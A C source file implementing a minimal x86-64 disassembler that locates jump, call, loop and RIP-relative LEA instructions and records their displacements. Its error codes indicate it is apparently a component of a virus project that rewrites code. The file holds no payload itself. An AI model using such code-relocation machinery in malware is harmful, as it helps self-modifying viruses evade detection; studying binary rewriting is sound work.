#include <unistd.h>
#include "disasm_utils.h"
#include "compiler_utils.h"
#include "utils.h"
#include "errors.h"

/*
Jc(onditionnal)c(ode) notes:
** - The terms “less” and “greater” are used for comparisons of signed integers.
** - The terms “above” and “below” are used for unsigned integers.
** - REX is used by default with Jcc.
*/

/*
** return true if successfully disassembled a control flow instruction
** return false if failed to disassemble a control flow instruction
*/
static bool	disasm_instruction(void **value_addr,
			uint8_t *value_length, int32_t *value,
			const void *code, size_t codelen)
{
	const uint8_t	*p = code;
	uint8_t		prefix = 0;
	uint8_t		opcode;

	*value_addr = NULL;
	*value_length = 0;
	*value = 0;

next_opcode:

	if (!codelen--)
		goto end;

	opcode = *p++;

	// REX prefixes
	if (opcode >= 0x40 && opcode <= 0x4f)
		{goto next_opcode;}
	// mandatory prefix for two-byte opcode
	else if (opcode == 0x0f)
		{prefix |= OP_PREFIX_0F; goto next_opcode;}

	// rel8
	if ((opcode >= 0x70 && opcode <= 0x7f)           // JMPcc
	|| (opcode >= 0xe0 && opcode <= 0xe3)            // LOOP/LOOPcc/JMPcc
	|| (opcode == 0xeb))                             // JMP
	{
		*value_addr = (void*)p;
		*value = *((int8_t*)p);
		*value_length = BYTE;
	}
	// rel16/32
	else if ((opcode == 0xe8)                          // CALL
	|| (opcode == 0xe9)                                // JMP
	|| (prefix && (opcode >= 0x80 && opcode <= 0x8f))) // JMPcc
	{
		*value_addr = (void*)p;
		*value = *((int32_t*)p);
		*value_length = DWORD;
	}
	// [rip + displacement]
	else if (opcode == 0x8d)                           // LEA
	{
		if (!codelen--)
			goto end;

		opcode = *p++;

		uint8_t	mod = (opcode & 0b11000000) >> 6;
		uint8_t	rm  = (opcode & 0b00000111);

		if (mod == 0b00 && rm == 0b101)
		{
			*value_addr = (void*)p;
			*value = *((int32_t*)p);
			*value_length = DWORD;
		}
	}
end:
	return (*value_addr && *value_length);
}

size_t		disasm_jumps(struct control_flow *buf, size_t buflen,
			const void *code, size_t codelen)
{
	void			*p_code = (void*)code;
	struct control_flow	*p_buf  = buf;
	uint8_t			instruction_length = 0;

	while (codelen && buflen)
	{
		instruction_length = disasm_length(p_code, codelen);

		if (instruction_length == 0)
			return errors(ERR_THROW, _ERR_NO, _ERR_T_DISASM_JUMPS);

		if (disasm_instruction(&p_buf->value_addr, &p_buf->value_length, &p_buf->value,
			p_code, codelen))
		{
			p_buf->addr       = p_code;
			p_buf->length     = instruction_length;
			p_buf->label_addr = p_buf->addr + instruction_length + p_buf->value;
			p_buf++;
			buflen--;
		}
		p_code   += instruction_length;
		codelen -= instruction_length;
	}

	// if bufflen reached 0 but not codelen, MAX_JUMPS is too small
	if (codelen != 0) return errors(ERR_VIRUS, _ERR_V_MAX_JUMP_REACHED, _ERR_T_DISASM_JUMPS);

	// number of control flow instructions successfully disassembled
	return (p_buf - buf);
}
